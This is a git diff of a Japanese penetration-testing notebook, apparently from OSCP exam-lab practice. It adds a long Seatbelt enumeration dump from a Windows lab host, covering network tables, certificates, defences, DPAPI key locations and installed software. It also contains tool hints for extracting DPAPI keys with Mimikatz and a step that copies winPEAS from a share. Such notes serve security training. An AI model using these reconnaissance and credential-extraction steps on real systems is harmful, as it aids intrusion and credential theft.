@@ -95,6 +95,10 @@ cp \\192.168.49.104\share\winPEASx64.exe .
 
 ### 興味深い情報
 
+- 認証情報
+```powershell
+
+```
 
 ---
 ---
@@ -113,7 +117,4368 @@ cp \\192.168.49.104\share\winPEASx64.exe .
 ## 記録用結果（長文注意）
 
 ```powershell
+a
 
+
+                        %&&@@@&&                                                                                  
+                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
+                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
+%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
+#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
+#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
+#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
+#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
+###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
+#####%######################  %%%..                       @////(((&%%%%%%%################                        
+                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
+                        &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,                                 
+                         #%%%%##,                                                                                 
+
+
+====== AMSIProviders ======
+
+  GUID                           : {2781761E-28E0-4109-99FE-B9D127C57AFE}
+  ProviderPath                   : 
+
+====== AntiVirus ======
+
+  Engine                         : Windows Defender
+  ProductEXE                     : windowsdefender://
+  ReportingEXE                   : %ProgramFiles%\Windows Defender\MsMpeng.exe
+
+====== AppLocker ======
+
+  [*] AppIDSvc service is Stopped
+
+    [*] Applocker is not running because the AppIDSvc is not running
+
+  [*] AppLocker not configured
+====== ARPTable ======
+
+  Loopback Pseudo-Interface 1 --- Index 1
+    Interface Description : Software Loopback Interface 1
+    Interface IPs      : ::1, 127.0.0.1
+    DNS Servers        : fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
+
+    Internet Address      Physical Address      Type
+    224.0.0.22            00-00-00-00-00-00     Static
+    224.0.0.252           00-00-00-00-00-00     Static
+    239.255.255.250       00-00-00-00-00-00     Static
+
+
+  Ethernet0 --- Index 11
+    Interface Description : vmxnet3 Ethernet Adapter
+    Interface IPs      : 192.168.104.206
+    Internet Address      Physical Address      Type
+    192.168.104.111       00-50-56-8A-67-09     Dynamic
+    192.168.104.254       00-50-56-8A-C5-9B     Dynamic
+    192.168.104.255       FF-FF-FF-FF-FF-FF     Static
+    224.0.0.22            01-00-5E-00-00-16     Static
+    224.0.0.251           01-00-5E-00-00-FB     Static
+    224.0.0.252           01-00-5E-00-00-FC     Static
+    239.255.255.250       01-00-5E-7F-FF-FA     Static
+
+
+  Ethernet1 --- Index 12
+    Interface Description : Intel(R) 82574L Gigabit Network Connection
+    Interface IPs      : 172.16.104.206
+    DNS Servers        : 172.16.104.200
+
+    Internet Address      Physical Address      Type
+    172.16.104.200        00-50-56-8A-16-6F     Dynamic
+    172.16.104.255        FF-FF-FF-FF-FF-FF     Static
+    224.0.0.22            01-00-5E-00-00-16     Static
+    224.0.0.251           01-00-5E-00-00-FB     Static
+    224.0.0.252           01-00-5E-00-00-FC     Static
+    239.255.255.250       01-00-5E-7F-FF-FA     Static
+
+
+====== AuditPolicies ======
+
+====== AuditPolicyRegistry ======
+
+====== AutoRuns ======
+
+
+  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
+    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
+====== Certificates ======
+
+====== CertificateThumbprints ======
+
+CurrentUser\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 4:59:59 PM
+CurrentUser\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 3:13:04 PM
+CurrentUser\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 3:04:01 PM
+CurrentUser\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 1:00:12 PM
+CurrentUser\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 12:50:46 PM
+CurrentUser\Root - 0119E81BE9A14CD8E22F40AC118C687ECBA3F4D8 (Microsoft Time Stamp Root Certificate Authority 2014) 10/22/2039 3:15:19 PM
+CurrentUser\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
+CurrentUser\Root - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 4:00:00 AM
+CurrentUser\Root - D69B561148F01C77C54578C10926DF5B856976AD (GlobalSign) 3/18/2029 3:00:00 AM
+CurrentUser\Root - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
+CurrentUser\Root - CABD2A79A1076A31F21D253635CB039D4329A5E8 (ISRG Root X1) 6/4/2035 4:04:38 AM
+CurrentUser\Root - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
+CurrentUser\Root - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 10:39:16 AM
+CurrentUser\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
+CurrentUser\Root - 925A8F8D2C6D04E0665F596AFF22D863E8256F3F (Starfield Services Root Certificate Authority - G2) 12/31/2037 3:59:59 PM
+CurrentUser\Root - 8CF427FD790C3AD166068DE81E57EFBB932272D4 (Entrust Root Certification Authority - G2) 12/7/2030 9:55:54 AM
+CurrentUser\Root - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
+CurrentUser\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
+CurrentUser\Root - 73A5E64A3BFF8316FF0EDCCC618A906E4EAE4D74 (Microsoft RSA Root Certificate Authority 2017) 7/18/2042 4:00:23 PM
+CurrentUser\Root - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
+CurrentUser\Root - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
+CurrentUser\Root - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 3:59:59 PM
+CurrentUser\Root - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
+CurrentUser\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
+LocalMachine\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 4:59:59 PM
+LocalMachine\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 3:13:04 PM
+LocalMachine\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 3:04:01 PM
+LocalMachine\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 1:00:12 PM
+LocalMachine\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 12:50:46 PM
+LocalMachine\Root - 0119E81BE9A14CD8E22F40AC118C687ECBA3F4D8 (Microsoft Time Stamp Root Certificate Authority 2014) 10/22/2039 3:15:19 PM
+LocalMachine\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
+LocalMachine\Root - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 4:00:00 AM
+LocalMachine\Root - D69B561148F01C77C54578C10926DF5B856976AD (GlobalSign) 3/18/2029 3:00:00 AM
+LocalMachine\Root - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
+LocalMachine\Root - CABD2A79A1076A31F21D253635CB039D4329A5E8 (ISRG Root X1) 6/4/2035 4:04:38 AM
+LocalMachine\Root - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
+LocalMachine\Root - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 10:39:16 AM
+LocalMachine\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
+LocalMachine\Root - 925A8F8D2C6D04E0665F596AFF22D863E8256F3F (Starfield Services Root Certificate Authority - G2) 12/31/2037 3:59:59 PM
+LocalMachine\Root - 8CF427FD790C3AD166068DE81E57EFBB932272D4 (Entrust Root Certification Authority - G2) 12/7/2030 9:55:54 AM
+LocalMachine\Root - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
+LocalMachine\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
+LocalMachine\Root - 73A5E64A3BFF8316FF0EDCCC618A906E4EAE4D74 (Microsoft RSA Root Certificate Authority 2017) 7/18/2042 4:00:23 PM
+LocalMachine\Root - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
+LocalMachine\Root - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
+LocalMachine\Root - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 3:59:59 PM
+LocalMachine\Root - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
+LocalMachine\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
+CurrentUser\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 3:59:59 PM
+LocalMachine\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 3:59:59 PM
+CurrentUser\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
+CurrentUser\AuthRoot - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 4:00:00 AM
+CurrentUser\AuthRoot - D69B561148F01C77C54578C10926DF5B856976AD (GlobalSign) 3/18/2029 3:00:00 AM
+CurrentUser\AuthRoot - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
+CurrentUser\AuthRoot - CABD2A79A1076A31F21D253635CB039D4329A5E8 (ISRG Root X1) 6/4/2035 4:04:38 AM
+CurrentUser\AuthRoot - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
+CurrentUser\AuthRoot - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 10:39:16 AM
+CurrentUser\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
+CurrentUser\AuthRoot - 925A8F8D2C6D04E0665F596AFF22D863E8256F3F (Starfield Services Root Certificate Authority - G2) 12/31/2037 3:59:59 PM
+CurrentUser\AuthRoot - 8CF427FD790C3AD166068DE81E57EFBB932272D4 (Entrust Root Certification Authority - G2) 12/7/2030 9:55:54 AM
+CurrentUser\AuthRoot - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
+CurrentUser\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
+CurrentUser\AuthRoot - 73A5E64A3BFF8316FF0EDCCC618A906E4EAE4D74 (Microsoft RSA Root Certificate Authority 2017) 7/18/2042 4:00:23 PM
+CurrentUser\AuthRoot - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
+CurrentUser\AuthRoot - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
+CurrentUser\AuthRoot - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 3:59:59 PM
+CurrentUser\AuthRoot - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
+CurrentUser\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
+LocalMachine\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
+LocalMachine\AuthRoot - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 4:00:00 AM
+LocalMachine\AuthRoot - D69B561148F01C77C54578C10926DF5B856976AD (GlobalSign) 3/18/2029 3:00:00 AM
+LocalMachine\AuthRoot - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
+LocalMachine\AuthRoot - CABD2A79A1076A31F21D253635CB039D4329A5E8 (ISRG Root X1) 6/4/2035 4:04:38 AM
+LocalMachine\AuthRoot - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
+LocalMachine\AuthRoot - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 10:39:16 AM
+LocalMachine\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
+LocalMachine\AuthRoot - 925A8F8D2C6D04E0665F596AFF22D863E8256F3F (Starfield Services Root Certificate Authority - G2) 12/31/2037 3:59:59 PM
+LocalMachine\AuthRoot - 8CF427FD790C3AD166068DE81E57EFBB932272D4 (Entrust Root Certification Authority - G2) 12/7/2030 9:55:54 AM
+LocalMachine\AuthRoot - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
+LocalMachine\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
+LocalMachine\AuthRoot - 73A5E64A3BFF8316FF0EDCCC618A906E4EAE4D74 (Microsoft RSA Root Certificate Authority 2017) 7/18/2042 4:00:23 PM
+LocalMachine\AuthRoot - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
+LocalMachine\AuthRoot - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
+LocalMachine\AuthRoot - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 3:59:59 PM
+LocalMachine\AuthRoot - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
+LocalMachine\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
+====== ChromiumBookmarks ======
+
+====== ChromiumHistory ======
+
+History (C:\Users\r.andrews\AppData\Local\Microsoft\Edge\User Data\Default\History):
+
+
+====== ChromiumPresence ======
+
+
+  C:\Users\r.andrews\AppData\Local\Microsoft\Edge\User Data\Default\
+
+    'History'     (2/21/2026 7:03:21 PM)  :  Run the 'ChromiumHistory' command
+====== CloudCredentials ======
+
+====== CloudSyncProviders ======
+
+====== CredEnum ======
+
+ERROR:   [!] Terminating exception running command 'CredEnum': System.ComponentModel.Win32Exception (0x80004005): Element not found
+   at Seatbelt.Commands.Windows.CredEnumCommand.<Execute>d__9.MoveNext()
+   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
+====== CredGuard ======
+
+====== dir ======
+
+  LastAccess LastWrite  Size      Path
+
+  26-02-21   26-02-21   0B        C:\Users\r.andrews\Documents\My Music\
+  26-02-21   26-02-21   0B        C:\Users\r.andrews\Documents\My Pictures\
+  26-02-21   26-02-21   0B        C:\Users\r.andrews\Documents\My Videos\
+  24-10-09   24-10-09   0B        C:\Users\Public\Documents\My Music\
+  24-10-09   24-10-09   0B        C:\Users\Public\Documents\My Pictures\
+  24-10-09   24-10-09   0B        C:\Users\Public\Documents\My Videos\
+  24-10-09   24-10-09   0B        C:\Users\Default\Documents\My Music\
+  24-10-09   24-10-09   0B        C:\Users\Default\Documents\My Pictures\
+  24-10-09   24-10-09   0B        C:\Users\Default\Documents\My Videos\
+====== DNSCache ======
+
+  Entry                          : dc20.oscp.exam
+  Name                           : DC20.oscp.exam
+  Data                           : 172.16.104.200
+
+  Entry                          : dc20.oscp.exam
+  Name                           : DC20.oscp.exam
+  Data                           : 172.16.104.200
+
+  Entry                          : slscr.update.microsoft.com
+  Name                           : 
+  Data                           : 
+
+====== DotNet ======
+
+  Installed CLR Versions
+      4.0.30319
+
+  Installed .NET Versions
+      4.8.09032
+
+  Anti-Malware Scan Interface (AMSI)
+      OS supports AMSI           : True
+     .NET version support AMSI   : True
+        [!] The highest .NET version is enrolled in AMSI!
+====== DpapiMasterKeys ======
+
+  Folder : C:\Users\r.andrews\AppData\Roaming\Microsoft\Protect\S-1-5-21-2481101513-2954867870-2660283483-1106
+
+    LastAccessed              LastModified              FileName
+    ------------              ------------              --------
+    2/21/2026 7:03:14 PM      2/21/2026 7:03:14 PM      ebcad355-d689-4d53-9a08-0b01698a6cb2
+
+
+  [*] Use the Mimikatz "dpapi::masterkey" module with appropriate arguments (/pvk or /rpc) to decrypt
+  [*] You can also extract many DPAPI masterkeys from memory with the Mimikatz "sekurlsa::dpapi" module
+  [*] You can also use SharpDPAPI for masterkey retrieval.
+====== Dsregcmd ======
+
+ERROR: Unable to collect. No relevant information were returned
+====== EnvironmentPath ======
+
+  Name                           : C:\Windows\system32
+  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)
+
+  Name                           : C:\Windows
+  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)
+
+  Name                           : C:\Windows\System32\Wbem
+  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)
+
+  Name                           : C:\Windows\System32\WindowsPowerShell\v1.0\
+  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)
+
+  Name                           : C:\Windows\System32\OpenSSH\
+  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)
+
+  Name                           : C:\Users\r.andrews\AppData\Local\Microsoft\WindowsApps
+  SDDL                           : O:S-1-5-21-2481101513-2954867870-2660283483-1106D:(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;S-1-5-21-2481101513-2954867870-2660283483-1106)
+
+====== EnvironmentVariables ======
+
+  <SYSTEM>                           ComSpec                            %SystemRoot%\system32\cmd.exe
+  <SYSTEM>                           DriverData                         C:\Windows\System32\Drivers\DriverData
+  <SYSTEM>                           OS                                 Windows_NT
+  <SYSTEM>                           Path                               %SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\;%SYSTEMROOT%\System32\OpenSSH\
+  <SYSTEM>                           PATHEXT                            .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+  <SYSTEM>                           PROCESSOR_ARCHITECTURE             AMD64
+  <SYSTEM>                           PSModulePath                       %ProgramFiles%\WindowsPowerShell\Modules;%SystemRoot%\system32\WindowsPowerShell\v1.0\Modules
+  <SYSTEM>                           TEMP                               %SystemRoot%\TEMP
+  <SYSTEM>                           TMP                                %SystemRoot%\TEMP
+  <SYSTEM>                           USERNAME                           SYSTEM
+  <SYSTEM>                           windir                             %SystemRoot%
+  <SYSTEM>                           NUMBER_OF_PROCESSORS               2
+  <SYSTEM>                           PROCESSOR_LEVEL                    6
+  <SYSTEM>                           PROCESSOR_IDENTIFIER               Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
+  <SYSTEM>                           PROCESSOR_REVISION                 4f01
+  NT AUTHORITY\SYSTEM                Path                               %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
+  NT AUTHORITY\SYSTEM                TEMP                               %USERPROFILE%\AppData\Local\Temp
+  NT AUTHORITY\SYSTEM                TMP                                %USERPROFILE%\AppData\Local\Temp
+  OSCP\r.andrews                     Path                               %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
+  OSCP\r.andrews                     TEMP                               %USERPROFILE%\AppData\Local\Temp
+  OSCP\r.andrews                     TMP                                %USERPROFILE%\AppData\Local\Temp
+  OSCP\r.andrews                     OneDrive                           C:\Users\r.andrews\OneDrive
+====== ExplicitLogonEvents ======
+
+ERROR: Unable to collect. Must be an administrator.
+====== ExplorerMRUs ======
+
+====== ExplorerRunCommands ======
+
+
+  S-1-5-21-2481101513-2954867870-2660283483-1106 :
+    a          :  notepad\1
+    MRUList    :  a
+====== FileInfo ======
+
+  Comments                       : 
+  CompanyName                    : Microsoft Corporation
+  FileDescription                : NT Kernel & System
+  FileName                       : C:\Windows\system32\ntoskrnl.exe
+  FileVersion                    : 10.0.22621.4317 (WinBuild.160101.0800)
+  InternalName                   : ntkrnlmp.exe
+  IsDebug                        : False
+  IsDotNet                       : False
+  IsPatched                      : False
+  IsPreRelease                   : False
+  IsPrivateBuild                 : False
+  IsSpecialBuild                 : False
+  Language                       : English (United States)
+  LegalCopyright                 : c Microsoft Corporation. All rights reserved.
+  LegalTrademarks                : 
+  OriginalFilename               : ntkrnlmp.exe
+  PrivateBuild                   : 
+  ProductName                    : Microsoftr Windowsr Operating System
+  ProductVersion                 : 10.0.22621.4317
+  SpecialBuild                   : 
+  Attributes                     : Archive
+  CreationTimeUtc                : 10/9/2024 7:09:28 PM
+  LastAccessTimeUtc              : 2/22/2026 4:05:12 AM
+  LastWriteTimeUtc               : 10/9/2024 7:09:29 PM
+  Length                         : 12060128
+  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;0x1200a9;;;SY)(A;;0x1200a9;;;BA)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)
+
+====== FileZilla ======
+
+====== FirefoxHistory ======
+
+====== FirefoxPresence ======
+
+====== Hotfixes ======
+
+Enumerating Windows Hotfixes. For *all* Microsoft updates, use the 'MicrosoftUpdates' command.
+
+  KB5044033  10/9/2024 12:00:00 AM  Update                         NT AUTHORITY\SYSTEM
+  KB5027397  7/4/2024 12:00:00 AM   Update                         
+  KB5044285  10/9/2024 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
+  KB5046247  10/9/2024 12:00:00 AM  Security Update                NT AUTHORITY\SYSTEM
+====== IdleTime ======
+
+  CurrentUser : OSCP\r.andrews
+  Idletime    : 00h:00m:34s:485ms (34485 milliseconds)
+
+====== IEFavorites ======
+
+Favorites (r.andrews):
+
+  http://go.microsoft.com/fwlink/p/?LinkId=255142
+
+====== IETabs ======
+
+====== IEUrls ======
+
+Internet Explorer typed URLs for the last 7 days
+
+====== InstalledProducts ======
+
+  DisplayName                    : Microsoft Edge
+  DisplayVersion                 : 100.0.1185.36
+  Publisher                      : Microsoft Corporation
+  InstallDate                    : 1/1/0001 12:00:00 AM
+  Architecture                   : x86
+
+  DisplayName                    : Microsoft Edge Update
+  DisplayVersion                 : 1.3.173.55
+  Publisher                      : 
+  InstallDate                    : 1/1/0001 12:00:00 AM
+  Architecture                   : x86
+
+  DisplayName                    : Microsoft Edge WebView2 Runtime
+  DisplayVersion                 : 100.0.1185.36
+  Publisher                      : 
+  InstallDate                    : 1/1/0001 12:00:00 AM
+  Architecture                   : x86
+
+  DisplayName                    : Microsoft Visual C++ 2015-2022 Redistributable (x64) - 14.32.31326
+  DisplayVersion                 : 14.32.31326.0
+  Publisher                      : Microsoft Corporation
+  InstallDate                    : 1/1/0001 12:00:00 AM
+  Architecture                   : x86
+
+  DisplayName                    : Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.32.31326
+  DisplayVersion                 : 14.32.31326
+  Publisher                      : Microsoft Corporation
+  InstallDate                    : 1/1/0001 12:00:00 AM
+  Architecture                   : x86
+
+  DisplayName                    : Microsoft Visual C++ 2015-2022 Redistributable (x86) - 14.32.31326
+  DisplayVersion                 : 14.32.31326.0
+  Publisher                      : Microsoft Corporation
+  InstallDate                    : 1/1/0001 12:00:00 AM
+  Architecture                   : x86
+
+  DisplayName                    : Microsoft Visual C++ 2022 X86 Additional Runtime - 14.32.31326
+  DisplayVersion                 : 14.32.31326
+  Publisher                      : Microsoft Corporation
+  InstallDate                    : 1/1/0001 12:00:00 AM
+  Architecture                   : x86
+
+  DisplayName                    : Microsoft Visual C++ 2022 X64 Additional Runtime - 14.32.31326
+  DisplayVersion                 : 14.32.31326
+  Publisher                      : Microsoft Corporation
+  InstallDate                    : 1/1/0001 12:00:00 AM
+  Architecture                   : x64
+
+  DisplayName                    : VMware Tools
+  DisplayVersion                 : 12.1.0.20219665
+  Publisher                      : VMware, Inc.
+  InstallDate                    : 1/1/0001 12:00:00 AM
